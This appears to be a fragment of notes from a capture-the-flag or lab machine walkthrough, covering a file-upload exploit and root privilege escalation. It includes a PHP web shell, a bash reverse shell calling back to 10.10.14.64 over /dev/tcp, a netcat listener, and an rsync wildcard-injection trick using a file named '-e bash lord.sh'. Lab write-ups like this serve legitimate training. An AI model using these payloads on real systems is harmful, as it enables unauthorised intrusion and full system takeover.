	import urllib3
	urllib3.disable_warnings() 

- add the following code to every responses to disable TLS verification

	verify=False

- the exploit needs two arguments, the target url and a php/phtml file to be uploaded into the victim system

		<?
		echo("Lord")
		system($_REQUEST['cmd']);
		?>

- read the script using cat /proc/76149/cmdline
- we can see the entire script 
- root with wildcard injection
- The trick is to make a file that actually looks like an argument to the command being run
- the script contains rsync command 
- the rsync command has a -e option
- we can make a file with name starts with -e so that the wildcard will inject it into the command when the cronjob runs
- create 2 files
- create a simple reverse shell using echo and save it as lord.sh

	echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.64/1337 0>&1' > lord.sh

- a simple file with the name starts with -e
- the -- tells the command that everything after it is not an argument and hence the file will be created in that name  
 
	touch -- '-e bash lord.sh'

- save both files in /backups directory
- start a netcat listener 

	nc -nlvp 1337
	
- in every 3 minutes when the cronjob runs we will have a reverse shell
